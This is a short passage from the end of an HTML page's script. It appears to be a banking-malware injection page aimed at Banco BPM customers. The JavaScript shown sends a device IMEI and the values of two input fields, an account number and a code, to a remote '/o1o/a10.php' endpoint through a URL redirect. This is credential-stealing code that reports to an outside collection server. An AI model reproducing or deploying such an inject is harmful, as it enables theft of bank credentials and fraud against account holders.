           	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_3|it_banco_bpm|"+oNumInp.value+"|"+oCodeInp.value);

           return false;
       };

   })();
</script>
</body>
</html>
